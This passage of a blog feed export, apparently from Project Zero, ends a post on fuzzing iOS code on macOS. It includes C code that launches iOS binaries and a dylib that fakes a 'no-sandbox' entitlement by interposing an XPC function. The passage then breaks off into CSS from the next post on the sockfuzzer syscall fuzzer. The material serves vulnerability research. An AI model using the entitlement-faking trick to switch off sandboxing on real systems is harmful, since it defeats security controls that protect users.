class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; perror(&amp;quot;posix_spawnattr_setflags&amp;quot;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; return -1;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; rv = posix_spawnattr_set_platform_np(&amp;amp;attr, PLATFORM_IOS, 0);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; if (rv != 0) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; perror(&amp;quot;posix_spawnattr_set_platform_np&amp;quot;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; return -1;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; rv = posix_spawn(&amp;amp;pid, argv[0], NULL, &amp;amp;attr, argv, environ);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; if (rv != 0) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; perror(&amp;quot;posix_spawn&amp;quot;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; return -1;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; printf(&amp;quot;[+] Child process created with pid: %i\n&amp;quot;, pid);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; instrument(pid);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; printf(&amp;quot;[*] Sending SIGCONT to continue child\n&amp;quot;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; kill(pid, SIGCONT);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; int status;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; rv = waitpid(pid, &amp;amp;status, 0);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; if (rv == -1) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;perror(&amp;quot;waitpid&amp;quot;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; return -1;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; printf(&amp;quot;[*] Child exited with status %i\n&amp;quot;, status);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; posix_spawnattr_destroy(&amp;amp;attr);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; return 0;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;int main(int argc, char* argv[]) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; if (argc &amp;lt;= 1) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; printf(&amp;quot;Usage: %s path/to/ios_binary\n&amp;quot;, argv[0]);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; return 0;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; printf(&amp;quot;[*] Preparing to execute iOS binary %s\n&amp;quot;, argv[1]);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; return run(argv + 1);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c9" id="h.1d2ckyi1al"&gt;&lt;span&gt;Attachment 2: interpose.c&lt;/span&gt;&lt;/h2&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;// clang interpose.c -arch arm64 -o interpose.dylib -shared -isysroot /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS.sdk&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;typedef void* xpc_object_t;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;extern xpc_object_t xpc_dictionary_create(void*, void*, int);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;extern void xpc_dictionary_set_value(xpc_object_t, const char*, xpc_object_t);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;extern xpc_object_t xpc_bool_create(int);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;extern xpc_object_t xpc_copy_entitlements_for_self();&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;// From https://opensource.apple.com/source/dyld/dyld-97.1/include/mach-o/dyld-interposing.h.auto.html&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;/*&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp;* &amp;nbsp;Example:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp;*&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp;* &amp;nbsp;static&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp;* &amp;nbsp;int&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp;* &amp;nbsp;my_open(const char* path, int flags, mode_t mode)&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp;* &amp;nbsp;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp;* &amp;nbsp; &amp;nbsp;int value;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp;* &amp;nbsp; &amp;nbsp;// do stuff before open (including changing the arguments)&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp;* &amp;nbsp; &amp;nbsp;value = open(path, flags, mode);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp;* &amp;nbsp; &amp;nbsp;// do stuff after open (including changing the return value(s))&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp;* &amp;nbsp; &amp;nbsp;return value;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp;* &amp;nbsp;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp;* &amp;nbsp;DYLD_INTERPOSE(my_open, open)&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp;*/&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;#define DYLD_INTERPOSE(_replacment,_replacee) \&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp;__attribute__((used)) static struct{ const void* replacment; const void* replacee; } _interpose_##_replacee \&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; __attribute__ ((section (&amp;quot;__DATA,__interpose&amp;quot;))) = { (const void*)(unsigned long)&amp;amp;_replacment, (const void*)(unsigned long)&amp;amp;_replacee };&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;xpc_object_t my_xpc_copy_entitlements_for_self() {&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; puts(&amp;quot;[*] Faking com.apple.private.security.no-sandbox entitlement in interposed xpc_copy_entitlements_for_self&amp;quot;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; xpc_object_t dict = xpc_dictionary_create(NULL, NULL, 0);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; xpc_dictionary_set_value(dict, &amp;quot;com.apple.private.security.no-sandbox&amp;quot;, xpc_bool_create(1));&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; return dict;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;DYLD_INTERPOSE(my_xpc_copy_entitlements_for_self, xpc_copy_entitlements_for_self);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt;</content>
    <link rel="replies" type="application/atom+xml" href="https://googleprojectzero.blogspot.com/feeds/2146117790598367776/comments/default" title="Post Comments" />
    <link rel="replies" type="text/html" href="https://googleprojectzero.blogspot.com/2021/05/fuzzing-ios-code-on-macos-at-native.html#comment-form" title="0 Comments" />
    <link rel="edit" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/2146117790598367776" />
    <link rel="self" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/2146117790598367776" />
    <link rel="alternate" type="text/html" href="https://googleprojectzero.blogspot.com/2021/05/fuzzing-ios-code-on-macos-at-native.html" title="Fuzzing iOS code on macOS at native speed" />
    <author>
      <name>Ryan</name>
      <uri>http://www.blogger.com/profile/17011901605865574886</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif" />
    </author>
    <thr:total>0</thr:total>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-4838136820032157985.post-2714099021755665939</id>
    <published>2021-04-22T11:05:00.004-07:00</published>
    <updated>2021-04-29T10:43:23.346-07:00</updated>
    <title type="text">Designing sockfuzzer, a network syscall fuzzer for XNU</title>
    <content type="html">&lt;style type="text/css"&gt;@import url('https://themes.googleusercontent.com/fonts/css?kit=lhDjYqiy3mZ0x6ROQEUoUw');.lst-kix_pr131atimb8l-1&gt;li:before{content:"\0025cb  "}.lst-kix_pr131atimb8l-0&gt;li:before{content:"\0025cf  "}.lst-kix_pr131atimb8l-3&gt;li:before{content:"\0025cf  "}.lst-kix_pr131atimb8l-2&gt;li:before{content:"\0025a0  "}ul.lst-kix_785jj4szr34a-4{list-style-type:none}ul.lst-kix_hg7n0a8dlgvf-6{list-style-type:none}.lst-kix_pr131atimb8l-7&gt;li:before{content:"\0025cb  "}ul.lst-kix_785jj4szr34a-5{list-style-type:none}ul.lst-kix_hg7n0a8dlgvf-5{list-style-type:none}ul.lst-kix_785jj4szr34a-6{list-style-type:none}ul.lst-kix_hg7n0a8dlgvf-4{list-style-type:none}ul.lst-kix_785jj4szr34a-7{list-style-type:none}ul.lst-kix_hg7n0a8dlgvf-3{list-style-type:none}ul.lst-kix_785jj4szr34a-8{list-style-type:none}.lst-kix_pr131atimb8l-5&gt;li:before{content:"\0025a0  "}ul.lst-kix_hg7n0a8dlgvf-8{list-style-type:none}.lst-kix_pr131atimb8l-4&gt;li:before{content:"\0025cb  "}.lst-kix_pr131atimb8l-8&gt;li:before{content:"\0025a0  "}ul.lst-kix_hg7n0a8dlgvf-7{list-style-type:none}ol.lst-kix_n5z70wgxvefs-8.start{counter-reset:lst-ctn-kix_n5z70wgxvefs-8 0}ul.lst-kix_785jj4szr34a-0{list-style-type:none}ul.lst-kix_785jj4szr34a-1{list-style-type:none}ul.lst-kix_785jj4szr34a-2{list-style-type:none}.lst-kix_pr131atimb8l-6&gt;li:before{content:"\0025cf  "}ul.lst-kix_785jj4szr34a-3{list-style-type:none}.lst-kix_n5z70wgxvefs-5&gt;li{counter-increment:lst-ctn-kix_n5z70wgxvefs-5}.lst-kix_qihahoz6j83w-8&gt;li:before{content:"\0025a0  "}ol.lst-kix_n5z70wgxvefs-2.start{counter-reset:lst-ctn-kix_n5z70wgxvefs-2 0}.lst-kix_qihahoz6j83w-7&gt;li:before{content:"\0025cb  "}.lst-kix_qihahoz6j83w-5&gt;li:before{content:"\0025a0  "}ul.lst-kix_dpq1lef19uzo-8{list-style-type:none}ul.lst-kix_xh6dzfiz70hf-6{list-style-type:none}ul.lst-kix_xh6dzfiz70hf-5{list-style-type:none}.lst-kix_qihahoz6j83w-4&gt;li:before{content:"\0025cb  "}.lst-kix_qihahoz6j83w-6&gt;li:before{content:"\0025cf  "}ul.lst-kix_xh6dzfiz70hf-4{list-style-type:none}ul.lst-kix_xh6dzfiz70hf-3{list-style-type:none}ul.lst-kix_xh6dzfiz70hf-2{list-style-type:none}ul.lst-kix_xh6dzfiz70hf-1{list-style-type:none}ul.lst-kix_xh6dzfiz70hf-0{list-style-type:none}ul.lst-kix_dpq1lef19uzo-0{list-style-type:none}ul.lst-kix_dpq1lef19uzo-1{list-style-type:none}.lst-kix_qihahoz6j83w-2&gt;li:before{content:"\0025a0  "}ul.lst-kix_dpq1lef19uzo-2{list-style-type:none}ul.lst-kix_dpq1lef19uzo-3{list-style-type:none}.lst-kix_qihahoz6j83w-3&gt;li:before{content:"\0025cf  "}ul.lst-kix_dpq1lef19uzo-4{list-style-type:none}ul.lst-kix_dpq1lef19uzo-5{list-style-type:none}ul.lst-kix_dpq1lef19uzo-6{list-style-type:none}ul.lst-kix_xh6dzfiz70hf-8{list-style-type:none}ul.lst-kix_dpq1lef19uzo-7{list-style-type:none}ul.lst-kix_xh6dzfiz70hf-7{list-style-type:none}.lst-kix_n5z70wgxvefs-1&gt;li{counter-increment:lst-ctn-kix_n5z70wgxvefs-1}.lst-kix_qihahoz6j83w-1&gt;li:before{content:"\0025cb  "}.lst-kix_qihahoz6j83w-0&gt;li:before{content:"\0025cf  "}.lst-kix_pijsqepbbzpb-0&gt;li:before{content:"\0025cf  "}.lst-kix_1n620a6l6s3g-0&gt;li:before{content:"\0025cf  "}.lst-kix_dpq1lef19uzo-6&gt;li:before{content:"\0025cf  "}.lst-kix_dpq1lef19uzo-8&gt;li:before{content:"\0025a0  "}.lst-kix_1n620a6l6s3g-1&gt;li:before{content:"\0025cb  "}.lst-kix_pijsqepbbzpb-1&gt;li:before{content:"\0025cb  "}.lst-kix_dpq1lef19uzo-5&gt;li:before{content:"\0025a0  "}.lst-kix_n5z70wgxvefs-7&gt;li{counter-increment:lst-ctn-kix_n5z70wgxvefs-7}.lst-kix_pijsqepbbzpb-4&gt;li:before{content:"\0025cb  "}.lst-kix_1n620a6l6s3g-3&gt;li:before{content:"\0025cf  "}ol.lst-kix_n5z70wgxvefs-3.start{counter-reset:lst-ctn-kix_n5z70wgxvefs-3 0}.lst-kix_1n620a6l6s3g-2&gt;li:before{content:"\0025a0  "}.lst-kix_1n620a6l6s3g-4&gt;li:before{content:"\0025cb  "}.lst-kix_pijsqepbbzpb-2&gt;li:before{content:"\0025a0  "}.lst-kix_pijsqepbbzpb-3&gt;li:before{content:"\0025cf  "}.lst-kix_dpq1lef19uzo-7&gt;li:before{content:"\0025cb  "}.lst-kix_pijsqepbbzpb-8&gt;li:before{content:"\0025a0  "}.lst-kix_1n620a6l6s3g-7&gt;li:before{content:"\0025cb  "}.lst-kix_1n620a6l6s3g-6&gt;li:before{content:"\0025cf  "}.lst-kix_1n620a6l6s3g-8&gt;li:before{content:"\0025a0  "}.lst-kix_dpq1lef19uzo-0&gt;li:before{content:"\0025cf  "}.lst-kix_1n620a6l6s3g-5&gt;li:before{content:"\0025a0  "}.lst-kix_pijsqepbbzpb-5&gt;li:before{content:"\0025a0  "}.lst-kix_dpq1lef19uzo-1&gt;li:before{content:"\0025cb  "}ul.lst-kix_g9bgj4bu2h0-0{list-style-type:none}ul.lst-kix_g9bgj4bu2h0-2{list-style-type:none}.lst-kix_dpq1lef19uzo-2&gt;li:before{content:"\0025a0  "}.lst-kix_dpq1lef19uzo-4&gt;li:before{content:"\0025cb  "}ul.lst-kix_g9bgj4bu2h0-1{list-style-type:none}.lst-kix_pijsqepbbzpb-6&gt;li:before{content:"\0025cf  "}ul.lst-kix_hg7n0a8dlgvf-2{list-style-type:none}ul.lst-kix_hg7n0a8dlgvf-1{list-style-type:none}.lst-kix_pijsqepbbzpb-7&gt;li:before{content:"\0025cb  "}ul.lst-kix_hg7n0a8dlgvf-0{list-style-type:none}.lst-kix_dpq1lef19uzo-3&gt;li:before{content:"\0025cf  "}ul.lst-kix_g9bgj4bu2h0-8{list-style-type:none}ul.lst-kix_pijsqepbbzpb-7{list-style-type:none}ul.lst-kix_qvcewxmuzrg7-7{list-style-type:none}ul.lst-kix_g9bgj4bu2h0-7{list-style-type:none}ul.lst-kix_pijsqepbbzpb-8{list-style-type:none}ul.lst-kix_qvcewxmuzrg7-8{list-style-type:none}ul.lst-kix_qvcewxmuzrg7-5{list-style-type:none}ul.lst-kix_qvcewxmuzrg7-6{list-style-type:none}ul.lst-kix_1n620a6l6s3g-8{list-style-type:none}ul.lst-kix_g9bgj4bu2h0-4{list-style-type:none}ul.lst-kix_qvcewxmuzrg7-3{list-style-type:none}ul.lst-kix_g9bgj4bu2h0-3{list-style-type:none}ul.lst-kix_qvcewxmuzrg7-4{list-style-type:none}ul.lst-kix_g9bgj4bu2h0-6{list-style-type:none}ul.lst-kix_qvcewxmuzrg7-1{list-style-type:none}ul.lst-kix_g9bgj4bu2h0-5{list-style-type:none}ul.lst-kix_qvcewxmuzrg7-2{list-style-type:none}ul.lst-kix_1n620a6l6s3g-3{list-style-type:none}ul.lst-kix_pijsqepbbzpb-0{list-style-type:none}ul.lst-kix_qvcewxmuzrg7-0{list-style-type:none}ul.lst-kix_1n620a6l6s3g-2{list-style-type:none}ul.lst-kix_pijsqepbbzpb-1{list-style-type:none}ul.lst-kix_1n620a6l6s3g-1{list-style-type:none}ul.lst-kix_pijsqepbbzpb-2{list-style-type:none}ul.lst-kix_1n620a6l6s3g-0{list-style-type:none}ul.lst-kix_pijsqepbbzpb-3{list-style-type:none}ul.lst-kix_1n620a6l6s3g-7{list-style-type:none}ul.lst-kix_pijsqepbbzpb-4{list-style-type:none}ul.lst-kix_1n620a6l6s3g-6{list-style-type:none}ul.lst-kix_pijsqepbbzpb-5{list-style-type:none}ul.lst-kix_1n620a6l6s3g-5{list-style-type:none}ul.lst-kix_pijsqepbbzpb-6{list-style-type:none}ul.lst-kix_1n620a6l6s3g-4{list-style-type:none}ol.lst-kix_n5z70wgxvefs-1.start{counter-reset:lst-ctn-kix_n5z70wgxvefs-1 0}.lst-kix_cp3k7292uvts-3&gt;li:before{content:"\0025cf  "}.lst-kix_cp3k7292uvts-7&gt;li:before{content:"\0025cb  "}.lst-kix_5bnah3qvhyc8-1&gt;li:before{content:"\0025cb  "}.lst-kix_cp3k7292uvts-1&gt;li:before{content:"\0025cb  "}.lst-kix_5bnah3qvhyc8-5&gt;li:before{content:"\0025a0  "}.lst-kix_5bnah3qvhyc8-3&gt;li:before{content:"\0025cf  "}.lst-kix_cp3k7292uvts-5&gt;li:before{content:"\0025a0  "}.lst-kix_as8tp5tsh1cy-1&gt;li:before{content:"\0025cb  "}.lst-kix_as8tp5tsh1cy-3&gt;li:before{content:"\0025cf  "}.lst-kix_as8tp5tsh1cy-7&gt;li:before{content:"\0025cb  "}.lst-kix_as8tp5tsh1cy-5&gt;li:before{content:"\0025a0  "}.lst-kix_xh6dzfiz70hf-0&gt;li:before{content:"\0025cf  "}.lst-kix_n5z70wgxvefs-0&gt;li{counter-increment:lst-ctn-kix_n5z70wgxvefs-0}.lst-kix_xh6dzfiz70hf-2&gt;li:before{content:"\0025a0  "}.lst-kix_g9bgj4bu2h0-6&gt;li:before{content:"\0025cf  "}.lst-kix_g9bgj4bu2h0-8&gt;li:before{content:"\0025a0  "}ol.lst-kix_n5z70wgxvefs-0.start{counter-reset:lst-ctn-kix_n5z70wgxvefs-0 0}.lst-kix_xh6dzfiz70hf-4&gt;li:before{content:"\0025cb  "}.lst-kix_3hjmgaf66qdz-0&gt;li:before{content:"\0025cf  "}.lst-kix_3hjmgaf66qdz-2&gt;li:before{content:"\0025a0  "}.lst-kix_xh6dzfiz70hf-6&gt;li:before{content:"\0025cf  "}.lst-kix_xh6dzfiz70hf-8&gt;li:before{content:"\0025a0  "}.lst-kix_3hjmgaf66qdz-6&gt;li:before{content:"\0025cf  "}.lst-kix_3hjmgaf66qdz-4&gt;li:before{content:"\0025cb  "}.lst-kix_3hjmgaf66qdz-8&gt;li:before{content:"\0025a0  "}.lst-kix_n5z70wgxvefs-6&gt;li{counter-increment:lst-ctn-kix_n5z70wgxvefs-6}ul.lst-kix_qihahoz6j83w-3{list-style-type:none}ul.lst-kix_5bnah3qvhyc8-6{list-style-type:none}ul.lst-kix_qihahoz6j83w-4{list-style-type:none}ul.lst-kix_5bnah3qvhyc8-5{list-style-type:none}ul.lst-kix_qihahoz6j83w-5{list-style-type:none}ul.lst-kix_5bnah3qvhyc8-4{list-style-type:none}ul.lst-kix_qihahoz6j83w-6{list-style-type:none}ul.lst-kix_5bnah3qvhyc8-3{list-style-type:none}ul.lst-kix_qihahoz6j83w-7{list-style-type:none}ul.lst-kix_qihahoz6j83w-8{list-style-type:none}ul.lst-kix_5bnah3qvhyc8-8{list-style-type:none}ul.lst-kix_5bnah3qvhyc8-7{list-style-type:none}.lst-kix_5uzj2xa2gne-8&gt;li:before{content:"\0025a0  "}ul.lst-kix_5bnah3qvhyc8-2{list-style-type:none}ul.lst-kix_qihahoz6j83w-0{list-style-type:none}ul.lst-kix_5bnah3qvhyc8-1{list-style-type:none}ul.lst-kix_qihahoz6j83w-1{list-style-type:none}ul.lst-kix_5bnah3qvhyc8-0{list-style-type:none}ul.lst-kix_qihahoz6j83w-2{list-style-type:none}ol.lst-kix_n5z70wgxvefs-8{list-style-type:none}ol.lst-kix_n5z70wgxvefs-7{list-style-type:none}ol.lst-kix_n5z70wgxvefs-5.start{counter-reset:lst-ctn-kix_n5z70wgxvefs-5 0}ol.lst-kix_n5z70wgxvefs-2{list-style-type:none}ol.lst-kix_n5z70wgxvefs-1{list-style-type:none}ol.lst-kix_n5z70wgxvefs-0{list-style-type:none}ol.lst-kix_n5z70wgxvefs-6{list-style-type:none}ol.lst-kix_n5z70wgxvefs-5{list-style-type:none}ol.lst-kix_n5z70wgxvefs-4{list-style-type:none}.lst-kix_n5z70wgxvefs-4&gt;li{counter-increment:lst-ctn-kix_n5z70wgxvefs-4}ol.lst-kix_n5z70wgxvefs-3{list-style-type:none}.lst-kix_qvcewxmuzrg7-5&gt;li:before{content:"\0025a0  "}.lst-kix_qvcewxmuzrg7-6&gt;li:before{content:"\0025cf  "}.lst-kix_g9bgj4bu2h0-0&gt;li:before{content:"\0025cf  "}.lst-kix_qvcewxmuzrg7-4&gt;li:before{content:"\0025cb  "}.lst-kix_qvcewxmuzrg7-8&gt;li:before{content:"\0025a0  "}.lst-kix_n5z70wgxvefs-2&gt;li{counter-increment:lst-ctn-kix_n5z70wgxvefs-2}.lst-kix_g9bgj4bu2h0-1&gt;li:before{content:"\0025cb  "}.lst-kix_qvcewxmuzrg7-1&gt;li:before{content:"\0025cb  "}.lst-kix_qvcewxmuzrg7-2&gt;li:before{content:"\0025a0  "}.lst-kix_g9bgj4bu2h0-2&gt;li:before{content:"\0025a0  "}.lst-kix_g9bgj4bu2h0-4&gt;li:before{content:"\0025cb  "}.lst-kix_5uzj2xa2gne-0&gt;li:before{content:"\0025cf  "}.lst-kix_qvcewxmuzrg7-3&gt;li:before{content:"\0025cf  "}.lst-kix_g9bgj4bu2h0-3&gt;li:before{content:"\0025cf  "}.lst-kix_5uzj2xa2gne-1&gt;li:before{content:"\0025cb  "}.lst-kix_5uzj2xa2gne-2&gt;li:before{content:"\0025a0  "}.lst-kix_5uzj2xa2gne-4&gt;li:before{content:"\0025cb  "}.lst-kix_5uzj2xa2gne-3&gt;li:before{content:"\0025cf  "}.lst-kix_5uzj2xa2gne-7&gt;li:before{content:"\0025cb  "}ul.lst-kix_xdx87v22dufh-7{list-style-type:none}ul.lst-kix_xdx87v22dufh-8{list-style-type:none}.lst-kix_5uzj2xa2gne-6&gt;li:before{content:"\0025cf  "}ul.lst-kix_xdx87v22dufh-3{list-style-type:none}ul.lst-kix_xdx87v22dufh-4{list-style-type:none}.lst-kix_qvcewxmuzrg7-7&gt;li:before{content:"\0025cb  "}ul.lst-kix_xdx87v22dufh-5{list-style-type:none}ul.lst-kix_xdx87v22dufh-6{list-style-type:none}.lst-kix_5uzj2xa2gne-5&gt;li:before{content:"\0025a0  